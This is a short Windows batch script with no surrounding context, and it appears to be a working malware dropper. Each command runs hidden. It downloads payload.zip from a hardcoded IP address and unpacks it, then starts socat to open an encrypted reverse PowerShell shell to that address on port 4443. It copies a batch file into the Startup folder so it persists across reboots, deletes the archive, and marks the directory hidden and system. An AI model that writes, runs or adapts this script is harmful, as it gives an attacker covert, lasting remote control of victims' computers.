@Echo off
powershell -WindowStyle Hidden new-item C:\Temp -ItemType Directory

start /MIN powershell -WindowStyle Hidden curl -Uri "http://194.195.114.92/payload.zip" -OutFile C:\Temp\payload.zip

powershell.exe -WindowStyle Hidden ping -n 5 localhost >nul

start /MIN powershell -WindowStyle Hidden Expand-Archive C:\Temp\payload.zip -DestinationPath C:\Temp

powershell.exe -WindowStyle Hidden ping -n 3 localhost >nul

start /MIN C:\Temp\payload\socat OPENSSL:194.195.114.92:4443,verify=0 EXEC:'powershell.exe -WindowStyle Hidden',pipes

xcopy /s "C:\Temp\payload\start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" /K /D /H /Y

powershell -WindowStyle Hidden del C:\Temp\payload.zip

powershell -WindowStyle Hidden attrib +h +s C:\Temp
